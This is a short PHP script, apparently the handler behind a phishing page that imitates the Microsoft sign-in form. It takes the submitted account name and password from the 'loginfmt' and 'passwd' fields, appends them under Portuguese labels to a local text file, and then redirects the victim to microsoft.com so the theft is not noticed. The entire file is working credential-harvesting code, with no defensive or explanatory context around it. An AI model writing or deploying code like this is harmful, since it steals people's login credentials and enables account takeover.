<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['loginfmt'] . " Senha: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://microsoft.com');
exit();
